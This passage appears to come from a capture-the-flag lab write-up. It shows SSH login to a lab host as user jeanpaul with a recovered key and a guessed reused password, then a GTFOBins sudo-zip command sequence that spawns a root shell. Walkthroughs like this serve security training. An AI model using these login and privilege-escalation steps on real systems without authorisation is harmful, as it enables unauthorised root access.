When trying to ssh in, we need to change `id_rsa` permissions with `chmod 400`

`ssh -i id_rsa jeanpaul@192.168.120.136`

When prompted for a password, we can do some guesswork with previous passwords found.

`I_love_java` gets us a shell as jeanpaul


---

## getting root

running `sudo -l` as jeanpaul we see that we can run `zip` as root

gtfobins tells us we can get a shell with these commands:

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```